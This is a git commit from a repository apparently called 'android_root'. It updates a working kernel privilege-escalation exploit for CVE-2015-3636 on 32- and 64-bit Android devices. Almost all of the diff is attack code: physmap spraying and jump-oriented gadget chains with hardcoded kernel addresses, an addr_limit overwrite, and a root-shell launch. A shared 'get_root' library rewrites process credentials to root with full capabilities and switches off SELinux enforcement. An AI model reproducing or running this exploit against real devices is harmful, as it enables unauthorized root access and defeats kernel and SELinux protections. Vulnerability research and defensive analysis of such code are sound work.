marsyy__littl_tools
commit 4f54f6efbb759bb199e2e78f7c161cd29171e701
Author:     daiyang <daiyang@antiy.cn>
AuthorDate: Mon Nov 14 11:51:31 2016 +0800
Commit:     daiyang <daiyang@antiy.cn>
CommitDate: Mon Nov 14 12:19:40 2016 +0800

    Develop | CVE-2015-3636 exploit for 64bits and 32bits devices
    
    Signed-off-by: daiyang <daiyang@antiy.cn>

diff --git a/android_root/cve-2015-3636/Android.mk b/android_root/cve-2015-3636/Android.mk
new file mode 100644
index 0000000..d661c89
--- /dev/null
+++ b/android_root/cve-2015-3636/Android.mk
@@ -0,0 +1,29 @@
+LOCAL_PATH:= $(call my-dir)
+include $(CLEAR_VARS)
+
+LOCAL_SRC_FILES:= \
+	exploit.c \
+
+
+LOCAL_SHARED_LIBRARIES := \
+	liblog \
+
+LOCAL_STATIC_LIBRARIES := get_root\
+
+LOCAL_C_INCLUDES := \
+    $(LOCAL_PATH)/../root_utils \
+    $(LOCAL_PATH)/ \
+	bionic \
+
+ifeq ($(shell expr $(PLATFORM_SDK_VERSION) "<" 23), 1)
+	LOCAL_SHARED_LIBRARIES += libstlport
+	LOCAL_C_INCLUDES += \
+		bionic/libstdc++/include \
+		external/stlport/stlport
+endif
+
+LOCAL_C_INCLUDES += \
+
+LOCAL_MODULE:= exp
+
+include $(BUILD_EXECUTABLE)
\ No newline at end of file
diff --git a/android_root/cve-2015-3636/exp b/android_root/cve-2015-3636/exp
deleted file mode 100755
index 61b9c33..0000000
Binary files a/android_root/cve-2015-3636/exp and /dev/null differ
diff --git a/android_root/cve-2015-3636/exploit.c b/android_root/cve-2015-3636/exploit.c
index ed562e2..349f98d 100644
--- a/android_root/cve-2015-3636/exploit.c
+++ b/android_root/cve-2015-3636/exploit.c
@@ -14,8 +14,8 @@
 #include "get_root.h"
 
 #define TOTAL_SOCK_NUM 9500000
-#define MAGIC_BASE_ADDR 0x1000
-#define MAGIC_ADDR 0x1360
+#define MAGIC_BASE_ADDR 0x200000
+#define MAGIC_ADDR 0x200200
 #define MAGIC_NUM(x) (0x0dead000|x)
 #define MEM_MIN_LEN 0x1000
 #define TAG "CVE_2015_3636"
@@ -50,6 +50,8 @@
 #endif
 #endif
 
+#define POINT_ADD(x,y) ((size_t)x+y)
+
 int sock_fd[SOCK_NUM];
 void *map_address[MAP_NUM];
 int kill_child = 0;
@@ -104,7 +106,7 @@ static int lock_page_in_memory(void *address, size_t size)
 	return 0;
 }
 
-static void inline populate_pagetable_for_address(void *address)
+static inline void populate_pagetable_for_address(void *address)
 {
 	*(void **)address = NULL;
 }
@@ -115,7 +117,7 @@ static int map_prepare_avoid_crash(){
 	PROT_READ | PROT_WRITE,
 	MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
 	if(map!=(void *)MAGIC_BASE_ADDR){
-		printf("[-]0x1360 failed\n");
+		printf("[-]0x200200 failed\n");
 		return false;
 	}
 	printf("[+]map prepare ok map:%p\n",map);
@@ -142,7 +144,7 @@ static int make_vul_socket(unsigned int num){
 }
 
 
-static void fill_map_whth_time_magic(void *address,unsigned int index){
+static void fill_map_whth_time_magic(void *address){
 	unsigned int *p;
 	unsigned int i,size;
 	unsigned int higher,lower;
@@ -170,7 +172,7 @@ static int create_n_socket(int *sock,int num){
 }
 
 
-void inline wait_to_be_kill(){
+static inline void wait_to_be_kill(){
 	while(!end_child){
 		sleep(1);
 	}
@@ -185,6 +187,7 @@ static inline void clean_child(int *sock,int num){
 }
 
 static inline void set_clean_flag(int sig){
+	int a = sig;//unused
 	usleep(1000);
 	end_child = 1;
 }
@@ -301,8 +304,7 @@ static int override_physmap(){
 		map = mmap(NULL,PYHSMAP_LENTH,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_SHARED,-1,0);
 		if(map != NULL){
 			map_address[i] = map;
-			fill_map_whth_time_magic(map,i);
-			printf("%d\n",i);
+			fill_map_whth_time_magic(map);
 			if(try_and_get_target()){
 				return 1;
 			}
@@ -335,7 +337,7 @@ static int create_main_socket(){
 
 static inline void construct_jop_leak_sp_32(){
 	void *map;
-	map = mmap((void *)JOP_BASE_ADDR-0x100,0x1000,PROT_WRITE | PROT_READ | PROT_EXEC,MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,-1,0);
+	map = mmap((void *)(JOP_BASE_ADDR-0x100),0x1000,PROT_WRITE | PROT_READ | PROT_EXEC,MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,-1,0);
 	if((unsigned long)map!=JOP_BASE_ADDR-0x100){
 		printf("[-]mmap jop base addr failed\n");
 		return;
@@ -379,35 +381,40 @@ static inline void construct_fack_prot_leak_sp_32(){
 									// .text:C06F9F90                 BLX             R3
 }
 
-static void construct_mem_patch_aadr_limit_32(){
+static inline void construct_mem_patch_aadr_limit_32(){
 	fack_prot[0] = (void *)0xc0184e54;
 							// .text:C0184E54                 LDR             R3, [R4,#4]
 							// .text:C0184E58                 MOVT            R0, #0x333
 							// .text:C0184E5C                 STR             R1, [R2,#0x20]
 							// .text:C0184E60                 BLX             R3
-	*(unsigned *)(target_sock_addr2+4) = 0xc0a1747c; // sk+4--->R4+4
+	*(unsigned *)((unsigned int)target_sock_addr2+4) = 0xc0a1747c; // sk+4--->R4+4
 }
 
+
+
 static void prepare_target_1_32(){
 	construct_jop_leak_sp_32();
 	construct_fack_prot_leak_sp_32();
-	target_sock_prot_addr1 = target_sock_addr1+SOCKPROT_OFFSET;
+	target_sock_prot_addr1 = (void *)POINT_ADD(target_sock_addr1,SOCKPROT_OFFSET);
 	*(unsigned long *)target_sock_prot_addr1 = (unsigned long)&fack_prot[0];
-	*(int *)(target_sock_addr1+0x2c) = 0; 	//mmap_queue
-	*(long *)(target_sock_addr1+0x88) = 0xffff0000;//time_flag
-	*(long *)(target_sock_addr1+0x6c) = JOP_BASE_ADDR;
-	memset(target_sock_addr1+0x88,0,0x300); //avoid crash
+	*(int *)POINT_ADD(target_sock_addr1,0x2c) = 0; 	//mmap_queue
+	*(long *)POINT_ADD(target_sock_addr1,0x88) = 0xffff0000;//time_flag
+	*(long *)POINT_ADD(target_sock_addr1,0x6c) = JOP_BASE_ADDR;
+	memset((void *)POINT_ADD(target_sock_addr1,0x88),0,0x300); //avoid crash
+
+
+
 }
 
 
 static void prepare_target_2_32(){
 	construct_mem_patch_aadr_limit_32();
-	target_sock_prot_addr2 = target_sock_addr2+SOCKPROT_OFFSET;
+	target_sock_prot_addr2 = (void *)POINT_ADD(target_sock_addr2,SOCKPROT_OFFSET);
 	*(unsigned long *)target_sock_prot_addr2 = (unsigned long)&fack_prot[0];
-	*(int *)(target_sock_addr2+0x2c) = 0; 	//mmap_queue
-	*(long *)(target_sock_addr2+0x88) = 0xffff0000;//time_flag
-	*(long *)(target_sock_addr2+0x6c) = (unsigned long)kerner_sp_bottom+8-0x20; //R2  addr_limit-0x20
-	memset(target_sock_addr2+0x88,0,0x300); //avoid crash
+	*(int *)POINT_ADD(target_sock_addr2,0x2c) = 0; 	//mmap_queue
+	*(long *)POINT_ADD(target_sock_addr2,0x88)  = 0xffff0000;//time_flag
+	*(long *)POINT_ADD(target_sock_addr2,0x6c) = (unsigned long)kerner_sp_bottom+8-0x20; //R2  addr_limit-0x20
+	memset((void *)POINT_ADD(target_sock_addr2,0x88),0,0x300); //avoid crash
 }
 
 #else
@@ -466,23 +473,23 @@ static void construct_jop_leak_sp_64(){
 static void prepare_target_1_64(){
 	construct_jop_leak_sp_64();
 	construct_fack_prot_leak_sp_64();
-	target_sock_prot_addr1 = target_sock_addr1+SOCKPROT_OFFSET;
+	target_sock_prot_addr1 = (void *)POINT_ADD(target_sock_addr1,SOCKPROT_OFFSET);
 	*(unsigned long *)target_sock_prot_addr1 = (unsigned long)&fack_prot[0];
-	*(int *)(target_sock_addr1+RXHASH_OFFSET) = 0;
-	*(long *)(target_sock_addr1+SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag,get x1 controled need this
-	*(long *)(target_sock_addr1+X1_OFFSET) = JOP_BASE_ADDR;
-	memset(target_sock_addr1+X1_OFFSET+0x20,0,0x300); //avoid crash
+	*(int *)POINT_ADD(target_sock_addr1,RXHASH_OFFSET) = 0;
+	*(long *)POINT_ADD(target_sock_addr1,SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag,get x1 controled need this
+	*(long *)POINT_ADD(target_sock_addr1,X1_OFFSET) = JOP_BASE_ADDR;
+	memset((void *)POINT_ADD(target_sock_addr1,X1_OFFSET+0x20),0,0x300); //avoid crash
 }
 
 
 static void prepare_target_2_64(){
 	construct_mem_patch_aadr_limit_64();
-	target_sock_prot_addr2 = target_sock_addr2+SOCKPROT_OFFSET;
+	target_sock_prot_addr2 = (void *)POINT_ADD(target_sock_addr2,SOCKPROT_OFFSET);
 	*(unsigned long *)target_sock_prot_addr2 = (unsigned long)&fack_prot[0];
-	*(int *)(target_sock_addr2+RXHASH_OFFSET) = 0; 	//mmap_queue
-	*(unsigned long *)(target_sock_addr2+SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag
-	*(unsigned long *)(target_sock_addr2+X1_OFFSET) = (unsigned long)kerner_sp_bottom+ADDR_LIMIT_OFFSET-0x48; //x1  addr_limit
-	memset(target_sock_addr2+X1_OFFSET+0x20,0,0x300); //avoid crash
+	*(int *)POINT_ADD(target_sock_addr2,RXHASH_OFFSET) = 0; 	//mmap_queue
+	*(long *)POINT_ADD(target_sock_addr2,SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag
+	*(long *)POINT_ADD(target_sock_addr2,X1_OFFSET) = (long)kerner_sp_bottom+ADDR_LIMIT_OFFSET-0x48; //x1  addr_limit
+	memset((void *)POINT_ADD(target_sock_addr2,X1_OFFSET+0x20),0,0x300); //avoid crash
 }
 
 #endif
@@ -571,6 +578,7 @@ int main(){
 		printf("[+]ready to get root\n");
 	}
 	if(get_root_after_addrlimit_patched(kerner_sp_bottom)){
+		clean_physmap();
 		system("/system/bin/sh");
 	}
 	scanf("%d",&ret);
diff --git a/android_root/cve-2015-3636/get_root.c b/android_root/cve-2015-3636/get_root.c
deleted file mode 100644
index 2530b94..0000000
--- a/android_root/cve-2015-3636/get_root.c
+++ /dev/null
@@ -1,266 +0,0 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <unistd.h>
-#include "get_root.h"
-
-#ifndef KERNEL_START
-	#ifndef __aarch64__
-	#define KERNEL_START 0xc0080000
-	#else
-	#define KERNEL_START 0xffffffc000080000
-	#endif
-#endif
-
-#define false 0
-#define true 1
-
-int read_pipe,write_pipe;
-
-static int write_kernel(void *target,void *buffer,unsigned size){
-	int ret,count = size;
-	while(count > 0){
-		ret = write(write_pipe,buffer,size);
-		if(ret != -1)
-			count -= ret;
-		else
-			return -1;
-	}
-	count = size;
-	while(count > 0){
-		ret = read(read_pipe,target,size);
-		if(ret != -1)
-			count -= ret;
-		else
-			return -1;
-	}
-	return 0;
-}
-
-static int read_kernel(void *target,void *buffer,unsigned size){
-	int ret,count = size;
-	while(count > 0){
-		ret = write(write_pipe,target,size);
-		if(ret != -1)
-			count -= ret;
-		else
-			return -1;
-	}
-	count = size;
-	while(count > 0){
-		ret = read(read_pipe,buffer,size);
-		if(ret != -1)
-			count -= ret;
-		else
-			return -1;
-	}
-	return 0;
-}
-
-
-static void *find_struct_cred_addr(void *task_struct_addr){
-	int ret,i;
-	struct task_struct *task;
-	void *cred_addr = NULL;
-	unsigned int size = 0x100*sizeof(size_t);
-	int *taskbuf = (int *)malloc(size);
-	if(!taskbuf){
-		printf("[-]malloc task space failed\n");
-		return NULL;
-	}
-	ret = read_kernel(task_struct_addr,taskbuf,size);
-	if(ret == -1)
-		printf("[-]copy task struct failed\n");
-	else{
-		for(i=0;i<size/4;i++){
-			task = (struct task_struct *)&taskbuf[i];
-			if(task->cpu_timers[0].next == task->cpu_timers[0].prev
-				&&(unsigned long)task->cpu_timers[0].next > KERNEL_START
-				&&task->cpu_timers[1].next == task->cpu_timers[1].prev
-				&&(unsigned long)task->cpu_timers[1].next > KERNEL_START
-				&&task->cpu_timers[2].next == task->cpu_timers[2].prev
-				&&(unsigned long)task->cpu_timers[2].next > KERNEL_START
-				&&task->real_cred == task->cred){
-					cred_addr = task->cred;
-					break;
-			}
-		}
-	}
-	if(cred_addr ==NULL){
-		printf("[-]get cred address failed\n");
-	}
-	else{
-		printf("[+]cred address : %p\n",cred_addr);
-	}
-	free(taskbuf);
-	return cred_addr;
-}
-
-
-static int patch_cred(void *cred_addr){
-	int ret;
-	struct cred *cred = (struct cred*)malloc(sizeof(struct cred)+0x40);
-	if(!cred){
-		printf("[-]malloc cred failed\n");
-		return -1;
-	}
-	ret = read_kernel(cred_addr,cred,sizeof(struct cred)+0x40);
-	if(ret == -1){
-		printf("[-]copy cred failed\n");
-	}else{
-		cred->uid = 0;
-		cred->gid = 0;
-		cred->suid = 0;
-		cred->sgid = 0;
-		cred->euid = 0;
-		cred->egid = 0;
-		cred->fsuid = 0;
-		cred->fsgid = 0;
-		cred->cap_inheritable.cap[0] = 0xffffffff;
-		cred->cap_inheritable.cap[1] = 0xffffffff;
-		cred->cap_permitted.cap[0] = 0xffffffff;
-		cred->cap_permitted.cap[1] = 0xffffffff;
-		cred->cap_effective.cap[0] = 0xffffffff;
-		cred->cap_effective.cap[1] = 0xffffffff;
-		cred->cap_bset.cap[0] = 0xffffffff;
-		cred->cap_bset.cap[1] = 0xffffffff;
-		ret = write_kernel(cred_addr,cred,sizeof(struct cred));//sizeof(struct cred));
-		if(ret == -1){
-			printf("[-]write cred to kernel stack failed\n");
-		}else{
-			printf("[+]write cred to kernel stack succuess\n");
-		}
-	}
-	free(cred);
-	return ret;
-}
-
-static int patch_selinux(void *security_addr){
-	int ret;
-	struct task_security_struct *security = (struct task_security_struct *)malloc(sizeof(struct task_security_struct));
-	security->osid = 1;
-	security->sid = 1;
-	security->exec_sid = 0;
-	security->create_sid = 0;
-	security->keycreate_sid = 0;
-	security->sockcreate_sid = 0;
-	ret = write_kernel(security_addr,security,sizeof(struct task_security_struct));
-	if(ret == -1){
-		printf("[-]selinux patch failed\n");
-	}else{
-		printf("[+]selinux patch ok\n");
-	}
-	return 0;
-}
-
-int patch_selinux_by_change_switch(void *selinux_enforcing,void *selinux_enabled){
-	unsigned int value = 0;
-	int ret1  = write_kernel(selinux_enforcing,&value,sizeof(int));
-	int ret2  = write_kernel(selinux_enabled,&value,sizeof(int));
-	if(ret1 == -1 || ret2 == -1){
-		printf("[-]selinux patch failed\n");
-	}else{
-		printf("[+]selinux patch ok\n");
-	}
-	return 0;
-}
-
-static void *get_stask_struct_addr(struct thread_info_head *thread_info){
-	void *task_struct_addr = NULL;
-	int ret;
-	ret = read_kernel(&thread_info->task,&task_struct_addr,sizeof(struct task_struct *));
-	if(ret == -1)
-		printf("[-]get stask struct address failed\n");
-	else
-		printf("[+]task_struct : %p\n",task_struct_addr);
-	return task_struct_addr;
-}
-
-
-static int prepare_pipe(){
-	int ret;
-	int pipe_fd[2];
-	ret = pipe(pipe_fd);
-	if(ret == -1){
-		printf("[-]pipe failed\n");
-		return false;
-	}
-	read_pipe = pipe_fd[0];
-	write_pipe = pipe_fd[1];
-	return true;
-}
-
-
-int get_root_after_addrlimit_patched(void *_thread_info){
-	void *task_struct_addr,*cred_addr;
-	struct thread_info_head *thread_info;
-	int ret;
-	if(!prepare_pipe()){
-		return false;
-	}
-	thread_info = (struct thread_info_head *)_thread_info;
-	task_struct_addr = get_stask_struct_addr(thread_info);
-	if(!task_struct_addr){
-		return false;
-	}
-	cred_addr = find_struct_cred_addr(task_struct_addr);
-	if(!cred_addr){
-		return false;
-	}
-	ret = patch_cred(cred_addr);
-	if(ret == -1){
-		return false;
-	}
-	if( getuid() == 0){
-		printf("[+]root done\n");
-		return true;
-	}else{
-		printf("[-]root failed\n");
-		return false;
-	}
-}
-
-#define PRESENT_MASK	(1ULL << 63) 	// get bit 63 from a 64-bit integer */
-#define PFN_MASK	((1ULL << 55) - 1)	// get bits 0-54 from
-#ifndef __aarch64__
-#define PFN_MIN 0x8400
-#define PHYS_OFFSET 0xc0000000
-#else
-#define PFN_MIN 0x40000
-#define PHYS_OFFSET 0xffffffc000000000
-#endif
-
-#ifndef PAGE_SIZE
-#define PAGE_SIZE 0x1000
-#endif
-void* compute_physmap(void *usr_addr){
-	char *path = "/proc/self/pagemap";
-	FILE* fp;
-	void *kaddr = NULL;
-	int ret;
-	uint64_t pentry = 0;
-	uint64_t PFN;
-	fp = fopen(path,"r");
-	if(fp == NULL){
-		printf("[-] /proc/self/pagemap open failed\n");
-		return NULL;
-	}
-	ret = fseek(fp,((unsigned long)usr_addr / PAGE_SIZE)*sizeof(uint64_t),SEEK_CUR);
-	if(ret == -1){
-		printf("[-] /proc/self/pagemap seek failed\n");
-		return NULL;
-	}
-	ret = fread(&pentry,sizeof(uint64_t),1,fp);
-	if(ret == -1){
-		printf("[-] read pagemap failed\n");
-		return NULL;
-	}
-	if(pentry & PRESENT_MASK == 0){
-		printf("[-]%p is not present in physical memory\n",usr_addr);
-	}else{
-		PFN = pentry & PFN_MASK;
-		kaddr = (void *)((size_t)(PFN-PFN_MIN)*PAGE_SIZE+PHYS_OFFSET);
-		printf("[+]PFN[%p]:%llu,target_kaddr:%p\n",usr_addr,PFN,kaddr);
-	}
-	return kaddr;
-}
\ No newline at end of file
diff --git a/android_root/cve-2015-3636/get_root.h b/android_root/cve-2015-3636/get_root.h
deleted file mode 100644
index 0a31c99..0000000
--- a/android_root/cve-2015-3636/get_root.h
+++ /dev/null
@@ -1,73 +0,0 @@
-#ifndef _GET_ROOT_H
-#define _GET_ROOT_H
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <unistd.h>
-
-struct cred;
-struct task_struct;
-struct thread_info_head;
-
-struct kernel_cap_struct {
-	unsigned int  cap[2];
-};
-
-struct cred {
-	unsigned int usage;
-	uid_t uid;
-	gid_t gid;
-	uid_t suid;
-	gid_t sgid;
-	uid_t euid;
-	gid_t egid;
-	uid_t fsuid;
-	gid_t fsgid;
-	unsigned int securebits;
-	struct kernel_cap_struct cap_inheritable;
-	struct kernel_cap_struct cap_permitted;
-	struct kernel_cap_struct cap_effective;
-	struct kernel_cap_struct cap_bset;
-	/* ... */
-};
-
-struct list_head {
-	struct list_head *next;
-	struct list_head *prev;
-};
-
-struct task_security_struct {
-	unsigned long osid;
-	unsigned long sid;
-	unsigned long exec_sid;
-	unsigned long create_sid;
-	unsigned long keycreate_sid;
-	unsigned long sockcreate_sid;
-};
-
-
-struct task_struct {
-	struct list_head cpu_timers[3];
-	struct cred *real_cred;
-	struct cred *cred;
-	struct cred *replacement_session_keyring;
-	char comm[16];
-};
-
-struct thread_info_head{
-	unsigned long		flags;		/* low level flags */
-#ifndef __aarch64__
-	int					preempt_count;
-#endif
-	unsigned long		addr_limit;	/* address limit */
-	struct task_struct	*task;		/* main task structure */
-};
-
-extern int get_root_after_addrlimit_patched(void *_thread_info);
-
-extern void* compute_physmap(void *usr_addr);
-
-extern int patch_selinux_by_change_switch(void *selinux_enforcing,void *selinux_enabled);
-
-#endif
\ No newline at end of file
diff --git a/android_root/cve-2015-3636/test.c b/android_root/cve-2015-3636/test.c
deleted file mode 100644
index e3c0951..0000000
--- a/android_root/cve-2015-3636/test.c
+++ /dev/null
@@ -1,70 +0,0 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/mman.h>
-#include <sys/socket.h>
-#include <string.h>
-#include <linux/in.h>
-#include <unistd.h>
-#include <arpa/inet.h>
-
-
-#define MAGIC_BASE_ADDR 0x1000
-#define MAGIC_ADDR 0x1360
-#define MAGIC_NUM 0xdeadbeef
-#define MEM_LEN 0x1000
-#define TAG "CVE_2015_3636"
-#define true 1
-#define false 0
-static int mapPrepare(){
-	void *map;
-	map =  mmap((void *)(MAGIC_BASE_ADDR),MEM_LEN,
-	PROT_READ | PROT_WRITE,
-	MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
-	if(map!=(void *)MAGIC_BASE_ADDR)
-		return false;
-	*(unsigned int *)MAGIC_ADDR = MAGIC_NUM;
-	return true;
-}
-
-static int socketConnect(){
-	struct sockaddr sa;
-	int ret;
-	int fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
-    if(fd==-1){
-    	printf("socket create failed");
-    	return false;
-    }
-	//hash sk
-    memset(&sa,0,sizeof(sa));
-    sa.sa_family = AF_INET;
-    ret = connect(fd,&sa,sizeof(sa));
-    //unhash sk
-    memset(&sa,0,sizeof(sa));
-    sa.sa_family = AF_UNSPEC;
-    ret = connect(fd,&sa,sizeof(sa));
-    //try to unhash sk
-    close(fd);
-    return true;
-}
-
-static int magicTest(){
-	printf("%x",*(int *)0x1360);
-	return (*(unsigned int *)MAGIC_ADDR == MAGIC_NUM);
-}
-
-static int CVE_2015_3636_BLOCK0(){
-	if(!mapPrepare())
-		 return -1;
-	if(!socketConnect())
-		 return -2;
-	if(magicTest())
-		return 0;
-	else
-		return 1;
-}
-
-int main(){
-	printf("%d",CVE_2015_3636_BLOCK0());
-	return 0;
-}
-
diff --git a/android_root/root_utils/Android.mk b/android_root/root_utils/Android.mk
new file mode 100644
index 0000000..559e89c
--- /dev/null
+++ b/android_root/root_utils/Android.mk
@@ -0,0 +1,19 @@
+LOCAL_PATH := $(call my-dir)
+include $(CLEAR_VARS)
+
+LOCAL_SRC_FILES := \
+	get_root.c
+
+LOCAL_C_INCLUDES := \
+	bionic \
+
+ifeq ($(shell expr $(PLATFORM_SDK_VERSION) "<" 23), 1)
+	LOCAL_SHARED_LIBRARIES += libstlport
+	LOCAL_C_INCLUDES += \
+						bionic/libstdc++/include \
+						external/stlport/stlport
+endif
+
+LOCAL_MODULE	:= get_root
+
+include $(BUILD_STATIC_LIBRARY)
\ No newline at end of file
diff --git a/android_root/root_utils/get_root.c b/android_root/root_utils/get_root.c
index 2530b94..6878334 100644
--- a/android_root/root_utils/get_root.c
+++ b/android_root/root_utils/get_root.c
@@ -59,10 +59,10 @@ static int read_kernel(void *target,void *buffer,unsigned size){
 
 
 static void *find_struct_cred_addr(void *task_struct_addr){
-	int ret,i;
+	int ret;
 	struct task_struct *task;
 	void *cred_addr = NULL;
-	unsigned int size = 0x100*sizeof(size_t);
+	unsigned int size = 0x100*sizeof(size_t),i;
 	int *taskbuf = (int *)malloc(size);
 	if(!taskbuf){
 		printf("[-]malloc task space failed\n");
@@ -255,12 +255,12 @@ void* compute_physmap(void *usr_addr){
 		printf("[-] read pagemap failed\n");
 		return NULL;
 	}
-	if(pentry & PRESENT_MASK == 0){
+	if((pentry & PRESENT_MASK) == 0){
 		printf("[-]%p is not present in physical memory\n",usr_addr);
 	}else{
 		PFN = pentry & PFN_MASK;
 		kaddr = (void *)((size_t)(PFN-PFN_MIN)*PAGE_SIZE+PHYS_OFFSET);
-		printf("[+]PFN[%p]:%llu,target_kaddr:%p\n",usr_addr,PFN,kaddr);
+		printf("[+]PFN[%p]:%llu,target_kaddr:%p\n",usr_addr,(long long unsigned int)PFN,kaddr);
 	}
 	return kaddr;
 }
\ No newline at end of file
